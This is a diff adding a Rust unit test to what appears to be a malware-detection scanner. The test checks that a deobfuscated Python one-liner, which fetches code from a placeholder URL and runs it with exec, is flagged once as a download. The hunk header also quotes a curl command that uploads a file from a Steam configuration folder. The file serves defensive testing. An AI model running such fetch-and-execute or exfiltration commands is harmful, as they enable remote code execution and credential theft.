@@ -11099,6 +11099,38 @@ curl --silent --output /dev/null -F steam=@"C:\Program Files (x86)\Steam\config\
     }
 
     #[test]
+    fn python_requests_request_get_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"python -c "import requests; exec(requests.request('GET', 'https://py.example/requests-request').text)""#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://py.example/requests-request" && dst.is_none()
+            )
+        });
+        assert!(
+            has,
+            "no structured Download from Python requests.request GET: {:?}",
+            env.traits
+        );
+        let generic_count = env
+            .traits
+            .iter()
+            .filter(|t| {
+                matches!(t, Trait::DownloadInDeobText { src, .. } if src == "https://py.example/requests-request")
+            })
+            .count();
+        assert_eq!(
+            generic_count, 0,
+            "Python requests.request GET URL double-emitted: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn python_requests_module_alias_get_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
